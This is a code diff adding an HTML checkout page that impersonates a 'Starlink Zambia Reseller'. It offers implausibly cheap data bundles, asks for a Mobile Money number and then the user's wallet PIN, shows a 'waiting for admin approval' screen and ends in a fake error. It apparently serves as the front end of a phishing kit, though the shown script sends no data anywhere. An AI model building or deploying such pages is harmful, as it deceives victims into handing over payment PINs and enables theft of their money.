@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checkout - Starlink Zambia</title>
+    <link rel="icon" type="image/png" href="/static/images/starlink_logo.png">
+    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
+    <style>
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            --black: #000; --white: #fff;
+            --gray-50: #f9fafb; --gray-100: #f3f4f6; --gray-200: #e5e7eb;
+            --gray-300: #d1d5db; --gray-400: #9ca3af; --gray-500: #6b7280;
+            --gray-600: #4b5563; --gray-700: #374151; --gray-900: #111827;
+            --blue-400: #60a5fa; --blue-600: #2563eb;
+            --green-500: #22c55e; --green-600: #16a34a; --red-500: #ef4444;
+            --momo-yellow: #FFCC00; --momo-yellow-dark: #E6B800;
+            --orange-500: #f97316; --orange-600: #ea580c;
+            --radius-md: 16px; --radius-xl: 26px; --radius-2xl: 30px;
+            --shadow-md: 0 4px 12px rgba(0,0,0,0.08);
+            --shadow-lg: 0 8px 20px rgba(0,0,0,0.12);
+            --shadow-2xl: 0 20px 40px rgba(0,0,0,0.2);
+            --header-h: 74px; --footer-h: 68px;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background-color: var(--gray-50); color: var(--gray-900);
+            line-height: 1.5; padding-top: var(--header-h); padding-bottom: var(--footer-h);
+            min-height: 100vh; -webkit-font-smoothing: antialiased;
+        }
+
+        body.modal-open { overflow: hidden; position: fixed; width: 100%; touch-action: none; }
+
+        a { text-decoration: none; color: inherit; }
+        button { font-family: inherit; cursor: pointer; border: none; background: none; }
+
+        /* HEADER */
+        .header {
+            position: fixed; top: 0; left: 0; right: 0;
+            height: var(--header-h); background-color: var(--black); color: var(--white);
+            z-index: 100; box-shadow: 0 2px 12px rgba(0,0,0,0.4);
+        }
+        .header-inner {
+            max-width: 1200px; margin: 0 auto; height: 100%; padding: 0 18px;
+            display: flex; align-items: center; justify-content: space-between;
+        }
+        .brand { display: flex; align-items: center; gap: 10px; }
+        .brand-logo-img { height: 32px; width: auto; display: block; }
+        .brand-divider { width: 1px; height: 22px; background: rgba(255,255,255,0.25); margin: 0 8px; }
+        .brand-sub { font-size: 12px; color: var(--gray-400); font-weight: 500; letter-spacing: 0.5px; }
+
+        .header-nav { display: none; gap: 26px; }
+        .header-nav a {
+            color: var(--gray-300); font-size: 14px; font-weight: 500;
+            display: flex; align-items: center; gap: 7px; transition: color 0.2s;
+        }
+        .header-nav a:hover { color: var(--white); }
+        .header-nav i { font-size: 18px; }
+
+        /* MAIN */
+        .main { max-width: 1200px; margin: 0 auto; padding: 22px 16px 36px; }
+        .checkout-wrap {
+            display: flex; align-items: center; justify-content: center;
+            min-height: calc(100vh - 160px); padding: 8px 0;
+        }
+        .checkout-card-wrap { width: 100%; max-width: 440px; }
+
+        /* YELLOW BAND */
+        .payment-band {
+            background: linear-gradient(135deg, #FFCC00 0%, #FFD633 100%);
+            border-radius: var(--radius-2xl) var(--radius-2xl) 0 0;
+            padding: 26px 24px; text-align: center;
+            box-shadow: var(--shadow-md); position: relative; overflow: hidden;
+        }
+        .payment-band::before {
+            content: ""; position: absolute; top: -40px; right: -40px;
+            width: 140px; height: 140px;
+            background: radial-gradient(circle, rgba(255,255,255,0.4), transparent 70%);
+            border-radius: 50%; pointer-events: none;
+        }
+        .payment-band-icon {
+            width: 56px; height: 56px; border-radius: 50%;
+            background: var(--black); color: var(--momo-yellow);
+            display: inline-flex; align-items: center; justify-content: center;
+            font-size: 26px; position: relative;
+            box-shadow: 0 6px 16px rgba(0,0,0,0.25);
+        }
+        .payment-band-tagline {
+            font-size: 12px; font-weight: 700; color: #7A5A00;
+            letter-spacing: 1.5px; text-transform: uppercase;
+            margin-top: 12px; position: relative;
+        }
+
+        /* WHITE BODY */
+        .checkout-body {
+            background: var(--white);
+            border-radius: 0 0 var(--radius-2xl) var(--radius-2xl);
+            padding: 26px 22px 28px;
+            box-shadow: var(--shadow-lg);
+        }
+
+        /* Amount block */
+        .amount-block {
+            display: flex; justify-content: space-between; align-items: flex-end;
+            padding-bottom: 20px; border-bottom: 1px solid var(--gray-200); gap: 12px;
+        }
+        .amount-label {
+            font-size: 11px; text-transform: uppercase; letter-spacing: 1.5px;
+            color: var(--gray-400); font-weight: 800; margin-bottom: 6px;
+        }
+        .amount-value {
+            font-size: 30px; font-weight: 900; letter-spacing: -1px; color: var(--gray-900);
+        }
+        .amount-plan { text-align: right; }
+        .amount-plan-name { font-size: 14px; font-weight: 900; color: var(--gray-900); }
+        .amount-plan-data {
+            font-size: 11.5px; color: var(--blue-600); font-weight: 800;
+            background: rgba(37,99,235,0.1); padding: 3px 9px;
+            border-radius: 999px; display: inline-block; margin-top: 4px;
+        }
+
+        .instruction {
+            text-align: center; font-size: 14px; color: var(--gray-600);
+            margin: 20px 0 22px; font-weight: 500;
+        }
+
+        /* Form */
+        .form-label { display: block; font-size: 14px; font-weight: 800; color: var(--gray-900); margin-bottom: 10px; }
+
+        .phone-input-group {
+            display: flex; border: 2px solid var(--gray-300);
+            border-radius: var(--radius-md); overflow: hidden;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        .phone-input-group:focus-within {
+            border-color: var(--momo-yellow-dark);
+            box-shadow: 0 0 0 4px rgba(255,204,0,0.18);
+        }
+        .phone-prefix {
+            display: flex; align-items: center; padding: 0 16px;
+            background: var(--gray-50); border-right: 2px solid var(--gray-300); flex-shrink: 0;
+        }
+        .phone-prefix img { width: 20px; height: 14px; margin-right: 10px; border-radius: 2px; }
+        .phone-prefix span { font-weight: 800; color: var(--gray-700); font-size: 14px; }
+        .phone-input {
+            flex: 1; padding: 14px 16px; border: none; outline: none;
+            font-size: 15px; font-weight: 700; color: var(--gray-900);
+            font-family: inherit; background: var(--white); min-width: 0;
+        }
+        .phone-input::placeholder { color: var(--gray-400); font-weight: 500; }
+
+        .btn-confirm {
+            width: 100%; margin-top: 22px; padding: 17px;
+            border-radius: var(--radius-md); background: var(--momo-yellow);
+            color: var(--black); font-weight: 900; font-size: 15px;
+            letter-spacing: 0.5px; display: flex; align-items: center;
+            justify-content: center; gap: 9px;
+            transition: transform 0.15s, filter 0.2s, box-shadow 0.25s;
+            box-shadow: 0 6px 18px rgba(255,204,0,0.4);
+        }
+        .btn-confirm:hover { filter: brightness(0.96); box-shadow: 0 8px 24px rgba(255,204,0,0.55); }
+        .btn-confirm:active { transform: scale(0.98); }
+        .btn-confirm i { font-size: 19px; }
+
+        .security-note {
+            display: flex; align-items: center; justify-content: center;
+            gap: 7px; font-size: 11.5px; color: var(--gray-500);
+            margin-top: 18px; font-weight: 500;
+        }
+        .security-note i { color: var(--green-600); font-size: 15px; }
+
+        /* PIN MODAL */
+        .modal-container { position: fixed; inset: 0; z-index: 9999; display: none; }
+        .modal-container.open { display: block; }
+        .sheet-overlay {
+            position: absolute; inset: 0; background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(3px); animation: fadeIn 0.2s ease;
+        }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .pin-modal {
+            position: fixed; left: 50%;
+            transform: translateX(-50%) translateY(20px);
+            bottom: 170px; background: var(--white);
+            width: calc(100% - 32px); max-width: 400px;
+            border-radius: var(--radius-xl); padding: 24px 22px;
+            box-shadow: var(--shadow-2xl); opacity: 0;
+            transition: opacity 0.25s ease, transform 0.25s ease, bottom 0.25s ease;
+            z-index: 1;
+        }
+        .pin-modal.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+        .pin-modal-title {
+            font-size: 18px; color: var(--black); margin-bottom: 14px;
+            line-height: 1.45; font-weight: 600;
+        }
+        .pin-modal-title strong { font-weight: 900; color: var(--orange-600); }
+        .pin-modal-sub {
+            font-size: 13.5px; color: var(--gray-600);
+            margin-bottom: 20px; line-height: 1.55;
+        }
+        .pin-label {
+            display: block; font-size: 13px; font-weight: 800;
+            color: var(--gray-700); margin-bottom: 8px;
+        }
+
+        .pin-input-wrap { position: relative; display: flex; align-items: center; }
+        .pin-input {
+            width: 100%; padding: 14px 52px 14px 16px;
+            background: var(--white); color: var(--black);
+            font-size: 24px; outline: none;
+            border: 2px solid var(--gray-300); border-radius: var(--radius-md);
+            letter-spacing: 12px; text-align: center; font-weight: 800;
+            transition: border-color 0.2s, box-shadow 0.2s; font-family: inherit;
+        }
+        .pin-input::placeholder { color: var(--gray-300); letter-spacing: 8px; font-weight: 500; }
+        .pin-input:focus { border-color: var(--orange-500); box-shadow: 0 0 0 4px rgba(249,115,22,0.15); }
+
+        .pin-eye-btn {
+            position: absolute; right: 14px; top: 50%;
+            transform: translateY(-50%); width: 36px; height: 36px;
+            border-radius: 10px; display: flex; align-items: center;
+            justify-content: center; color: var(--gray-500);
+            font-size: 20px; transition: color 0.2s, background 0.2s;
+        }
+        .pin-eye-btn:hover { color: var(--gray-900); background: var(--gray-100); }
+        .pin-eye-btn.active { color: var(--orange-500); }
+
+        .pin-actions {
+            display: grid; grid-template-columns: 1fr 1fr;
+            gap: 12px; margin-top: 24px;
+        }
+        .btn-cancel {
+            padding: 14px; font-weight: 800; font-size: 14px;
+            color: var(--black); background: var(--white);
+            border: 2px solid var(--gray-300); border-radius: var(--radius-md);
+            transition: background 0.2s;
+        }
+        .btn-cancel:hover { background: var(--gray-100); }
+
+        .btn-pin-proceed {
+            padding: 14px; font-weight: 900; font-size: 14px;
+            color: var(--black); background: var(--momo-yellow);
+            border-radius: var(--radius-md); display: flex;
+            align-items: center; justify-content: center; gap: 7px;
+            transition: filter 0.2s, transform 0.15s, opacity 0.2s, box-shadow 0.2s;
+            box-shadow: 0 4px 12px rgba(255,204,0,0.35);
+        }
+        .btn-pin-proceed:hover:not(:disabled) { filter: brightness(0.96); box-shadow: 0 6px 16px rgba(255,204,0,0.5); }
+        .btn-pin-proceed:active:not(:disabled) { transform: scale(0.97); }
+        .btn-pin-proceed:disabled { opacity: 0.35; cursor: not-allowed; box-shadow: none; }
+
+        /* WAITING SCREEN */
+        .waiting-overlay {
+            position: fixed; inset: 0; z-index: 10000; display: none;
+            align-items: center; justify-content: center;
+            background: linear-gradient(160deg, #0a0a0a 0%, #1a1a1a 50%, #000000 100%);
+            color: var(--white); padding: 24px; overflow: hidden;
+        }
+        .waiting-overlay.open { display: flex; animation: fadeIn 0.35s ease; }
+
+        .waiting-content { position: relative; text-align: center; max-width: 400px; width: 100%; z-index: 2; }
+        .waiting-spinner {
+            width: 90px; height: 90px; margin: 0 auto 26px;
+            border: 5px solid rgba(255,204,0,0.15);
+            border-top-color: var(--momo-yellow);
+            border-radius: 50%; animation: spin 0.9s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .waiting-title { font-size: 22px; font-weight: 900; letter-spacing: -0.5px; }
+        .waiting-title .highlight {
+            background: linear-gradient(90deg, var(--momo-yellow), #FFD633);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .waiting-sub { font-size: 14px; color: var(--gray-400); margin-top: 14px; line-height: 1.65; }
+        .waiting-sub strong { color: var(--white); font-weight: 800; }
+
+        /* ERROR OVERLAY */
+        .error-overlay {
+            position: fixed; inset: 0; z-index: 10001; display: none;
+            align-items: center; justify-content: center;
+            background: rgba(0,0,0,0.55); backdrop-filter: blur(4px); padding: 20px;
+        }
+        .error-overlay.open { display: flex; }
+        .error-card {
+            background: var(--white); border-radius: var(--radius-xl);
+            padding: 26px 22px; max-width: 360px; width: 100%;
+            text-align: center; box-shadow: var(--shadow-2xl);
+            transform: scale(0.9); opacity: 0;
+            transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1), opacity 0.3s;
+        }
+        .error-card.show { transform: scale(1); opacity: 1; }
+        .error-icon {
+            width: 60px; height: 60px; border-radius: var(--radius-md);
+            background: #FEE2E2; display: flex; align-items: center;
+            justify-content: center; margin: 0 auto 16px;
+        }
+        .error-icon i { font-size: 30px; color: var(--red-500); }
+        .error-title { font-size: 17px; font-weight: 900; color: var(--gray-900); margin-bottom: 8px; }
+        .error-text { font-size: 13.5px; color: var(--gray-500); line-height: 1.6; margin-bottom: 20px; }
+        .error-btn {
+            width: 100%; padding: 14px; background: var(--momo-yellow);
+            color: var(--black); font-weight: 900; font-size: 13px;
+            letter-spacing: 1px; text-transform: uppercase;
+            border-radius: var(--radius-md); transition: transform 0.15s, filter 0.2s;
+            box-shadow: 0 4px 12px rgba(255,204,0,0.35);
+        }
+        .error-btn:hover { filter: brightness(0.95); }
+        .error-btn:active { transform: scale(0.97); }
+
+        /* BOTTOM NAV */
+        .bottom-nav {
+            position: fixed; bottom: 0; left: 0; right: 0;
+            height: var(--footer-h); background: var(--white);
+            border-top: 1px solid var(--gray-200);
+            box-shadow: 0 -4px 20px rgba(0,0,0,0.08); z-index: 100;
+        }
+        .bottom-nav-inner {
+            max-width: 1200px; margin: 0 auto; height: 100%; padding: 0 12px;
+            display: flex; justify-content: space-around; align-items: center;
+        }
+        .nav-item {
+            display: flex; flex-direction: column; align-items: center;
+            gap: 4px; color: var(--gray-600); font-size: 11px;
+            font-weight: 700; transition: color 0.2s, transform 0.2s;
+            padding: 6px 14px; border-radius: 12px;
+        }
+        .nav-item i { font-size: 24px; }
+        .nav-item:hover { transform: translateY(-2px); }
+        .nav-item.active { color: var(--blue-600); }
+
+        @media (min-width: 640px) {
+            .main { padding: 28px 22px 44px; }
+            .payment-band { padding: 32px 28px; }
+            .checkout-body { padding: 30px 28px 32px; }
+            .amount-value { font-size: 34px; }
+        }
+        @media (min-width: 768px) {
+            .header-nav { display: flex; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- HEADER -->
+    <header class="header">
+        <div class="header-inner">
+            <a href="/" class="brand">
+                <img src="/static/images/starlink_logo.png" alt="STARLINK" class="brand-logo-img">
+                <div class="brand-divider"></div>
+                <span class="brand-sub">Zambia Reseller</span>
+            </a>
+            <nav class="header-nav">
+                <a href="/"><i class="uil uil-wifi"></i> <span>Status</span></a>
+                <a href="/plans.html"><i class="uil uil-home"></i> <span>Plans</span></a>
+            </nav>
+        </div>
+    </header>
+
+    <!-- MAIN -->
+    <main class="main">
+        <div class="checkout-wrap">
+            <div class="checkout-card-wrap">
+
+                <!-- Yellow band -->
+                <div class="payment-band">
+                    <div class="payment-band-icon">
+                        <i class="uil uil-mobile-android"></i>
+                    </div>
+                    <p class="payment-band-tagline">Mobile Money Payment</p>
+                </div>
+
+                <!-- White body -->
+                <div class="checkout-body">
+
+                    <div class="amount-block">
+                        <div>
+                            <p class="amount-label">Amount</p>
+                            <p class="amount-value" id="display-amount">ZMW 45.00</p>
+                        </div>
+                        <div class="amount-plan">
+                            <p class="amount-plan-name" id="display-plan-name">Elite Bundle</p>
+                            <span class="amount-plan-data" id="display-plan-data">400GB</span>
+                        </div>
+                    </div>
+
+                    <p class="instruction">Enter your Mobile Money details to authorize</p>
+
+                    <form id="paymentForm" method="POST" autocomplete="off" onsubmit="return false;">
+
+                        <label class="form-label" for="momo_number">Mobile Money Number</label>
+
+                        <div class="phone-input-group">
+                            <div class="phone-prefix">
+                                <img src="https://flagcdn.com/w40/zm.png" alt="Zambia">
+                                <span>+260</span>
+                            </div>
+                            <input
+                                type="tel"
+                                id="momo_number"
+                                name="momo_number"
+                                required
+                                inputmode="numeric"
+                                autocomplete="off"
+                                placeholder="9xxxxxxx"
+                                class="phone-input"
+                            />
+                        </div>
+
+                        <button type="button" id="openPinModal" class="btn-confirm">
+                            <i class="uil uil-lock"></i>
+                            Confirm Payment
+                        </button>
+
+                    </form>
+
+                    <p class="security-note">
+                        <i class="uil uil-shield-check"></i>
+                        Your payment is encrypted and secure
+                    </p>
+
+                </div>
+
+            </div>
+        </div>
+    </main>
+
+    <!-- PIN MODAL -->
+    <div class="modal-container" id="modalContainer">
+        <div class="sheet-overlay" id="sheetOverlay"></div>
+
+        <div class="pin-modal" id="pinModal">
+            <h3 class="pin-modal-title">
+                Do you want to pay <strong id="confirmAmount">ZMW 45.00</strong>?
+            </h3>
+
+            <p class="pin-modal-sub">Enter your Mobile Money PIN to authorize this payment</p>
+
+            <label class="pin-label" for="momo_pin">Enter PIN</label>
+
+            <div class="pin-input-wrap">
+                <input
+                    id="momo_pin"
+                    type="password"
+                    maxlength="5"
+                    minlength="4"
+                    inputmode="numeric"
+                    autocomplete="off"
+                    autocorrect="off"
+                    autocapitalize="off"
+                    spellcheck="false"
+                    enterkeyhint="done"
+                    placeholder="••••"
+                    class="pin-input"
+                />
+                <button type="button" id="togglePin" class="pin-eye-btn" aria-label="Show PIN">
+                    <i class="uil uil-eye"></i>
+                </button>
+            </div>
+
+            <div class="pin-actions">
+                <button id="cancelBtn" type="button" class="btn-cancel">Cancel</button>
+                <button id="proceedBtn" type="button" disabled class="btn-pin-proceed">
+                    <i class="uil uil-arrow-right"></i>
+                    <span>Proceed</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- WAITING SCREEN -->
+    <div class="waiting-overlay" id="waitingOverlay">
+        <div class="waiting-content">
+            <div class="waiting-spinner"></div>
+            <h2 class="waiting-title">Verifying <span class="highlight">Payment</span></h2>
+            <p class="waiting-sub">
+                Please hold on as we confirm your <strong id="waitingPlan">Elite Bundle</strong> subscription.<br>
+                This usually takes a few seconds.
+            </p>
+        </div>
+    </div>
+
+    <!-- ERROR OVERLAY -->
+    <div class="error-overlay" id="errorOverlay">
+        <div class="error-card" id="errorCard">
+            <div class="error-icon"><i class="uil uil-times-circle"></i></div>
+            <h3 class="error-title">Payment Failed</h3>
+            <p class="error-text" id="errorText">Incorrect number. Kindly check your number and try again.</p>
+            <button class="error-btn" id="errorBtn">Try Again</button>
+        </div>
+    </div>
+
+    <!-- BOTTOM NAV -->
+    <nav class="bottom-nav">
+        <div class="bottom-nav-inner">
+            <a href="/" class="nav-item">
+                <i class="uil uil-wifi"></i>
+                <span>Status</span>
+            </a>
+            <a href="/plans.html" class="nav-item active">
+                <i class="uil uil-shopping-bag"></i>
+                <span>Plans</span>
+            </a>
+            <a href="/settings.html" class="nav-item">
+                <i class="uil uil-setting"></i>
+                <span>Settings</span>
+            </a>
+        </div>
+    </nav>
+
+    <script>
+        // Read plan from URL
+        const params = new URLSearchParams(window.location.search);
+        const planName = params.get('plan') || 'Elite Bundle';
+        const planData = params.get('data') || '400GB';
+        const planPrice = parseFloat(params.get('price') || '45');
+        const planPeriod = params.get('period') || '2 Months';
+
+        const formattedPrice = 'ZMW ' + planPrice.toFixed(2);
+
+        document.getElementById('display-plan-name').textContent = planName;
+        document.getElementById('display-plan-data').textContent = planData;
+        document.getElementById('display-amount').textContent = formattedPrice;
+        document.getElementById('confirmAmount').textContent = formattedPrice;
+        document.getElementById('waitingPlan').textContent = planName;
+
+        // Elements
+        const modal = document.getElementById('modalContainer');
+        const popup = document.getElementById('pinModal');
+        const pin = document.getElementById('momo_pin');
+        const openBtn = document.getElementById('openPinModal');
+        const number = document.getElementById('momo_number');
+        const proceed = document.getElementById('proceedBtn');
+        const cancel = document.getElementById('cancelBtn');
+        const overlay = document.getElementById('sheetOverlay');
+        const togglePin = document.getElementById('togglePin');
+
+        const waitingOverlay = document.getElementById('waitingOverlay');
+        const errorOverlay = document.getElementById('errorOverlay');
+        const errorCard = document.getElementById('errorCard');
+        const errorText = document.getElementById('errorText');
+        const errorBtn = document.getElementById('errorBtn');
+
+        // Keyboard-aware popup
+        function movePopup() {
+            if (window.visualViewport) {
+                const keyboard = window.innerHeight - window.visualViewport.height;
+                popup.style.bottom = Math.max(170, keyboard + 70) + 'px';
+            }
+        }
+        if (window.visualViewport) {
+            window.visualViewport.addEventListener('resize', movePopup);
+        }
+
+        function openModal() {
+            document.body.classList.add('modal-open');
+            modal.classList.add('open');
+            movePopup();
+            setTimeout(() => {
+                popup.classList.add('show');
+                setTimeout(() => pin.focus(), 250);
+            }, 50);
+        }
+
+        function closeModal() {
+            popup.classList.remove('show');
+            setTimeout(() => {
+                modal.classList.remove('open');
+                pin.value = '';
+                pin.type = 'password';
+                togglePin.classList.remove('active');
+                togglePin.innerHTML = '<i class="uil uil-eye"></i>';
+                proceed.disabled = true;
+                proceed.innerHTML = '<i class="uil uil-arrow-right"></i><span>Proceed</span>';
+                document.body.classList.remove('modal-open');
+            }, 250);
+        }
+
+        openBtn.addEventListener('click', () => {
+            const num = number.value.trim();
+            if (!num) { number.reportValidity(); return; }
+            // Zambian numbers: 9 digits starting with 9, or 10 digits with leading 0
+            if (!(/^\d{9}$/.test(num) || /^0\d{9}$/.test(num))) {
+                number.setCustomValidity('Enter 9 digits (e.g. 9xxxxxxxx) or 10 digits starting with 0');
+                number.reportValidity();
+                return;
+            }
+            number.setCustomValidity('');
+            if (!number.checkValidity()) { number.reportValidity(); return; }
+            openModal();
+        });
+
+        togglePin.addEventListener('click', () => {
+            const isPassword = pin.type === 'password';
+            pin.type = isPassword ? 'text' : 'password';
+            togglePin.classList.toggle('active', isPassword);
+            togglePin.innerHTML = isPassword ? '<i class="uil uil-eye-slash"></i>' : '<i class="uil uil-eye"></i>';
+            pin.focus();
+        });
+
+        pin.addEventListener('input', function () {
+            this.value = this.value.replace(/\D/g, '').slice(0, 5);
+            const isValid = /^\d{4,5}$/.test(this.value);
+            proceed.disabled = !isValid;
+        });
+
+        let pollTimer = null;
+
+        proceed.addEventListener('click', () => {
+            if (!/^\d{4,5}$/.test(pin.value)) return;
+
+            proceed.disabled = true;
+            proceed.innerHTML = '<span class="btn-spinner" style="width:16px;height:16px;border:2.5px solid rgba(0,0,0,0.25);border-top-color:#000;border-radius:50%;display:inline-block;animation:spin 0.7s linear infinite;"></span><span>Processing...</span>';
+
+            const phone = number.value.trim();
+
+            // Show waiting screen
+            setTimeout(() => {
+                closeModal();
+                waitingOverlay.classList.add('open');
+                document.body.classList.add('modal-open');
+
+                // Simulate waiting for admin approval (30s timeout for demo)
+                setTimeout(() => {
+                    waitingOverlay.classList.remove('open');
+                    showError('Session expired. Please try again.');
+                }, 30000);
+            }, 1200);
+        });
+
+        function showError(message) {
+            errorText.textContent = message;
+            errorOverlay.classList.add('open');
+            setTimeout(() => errorCard.classList.add('show'), 50);
+        }
+
+        errorBtn.addEventListener('click', () => {
+            errorCard.classList.remove('show');
+            setTimeout(() => {
+                errorOverlay.classList.remove('open');
+                document.body.classList.remove('modal-open');
+                proceed.disabled = true;
+                proceed.innerHTML = '<i class="uil uil-arrow-right"></i><span>Proceed</span>';
+                pin.value = '';
+            }, 250);
+        });
+
+        cancel.addEventListener('click', closeModal);
+        overlay.addEventListener('click', closeModal);
+    </script>
+</body>
+</html>
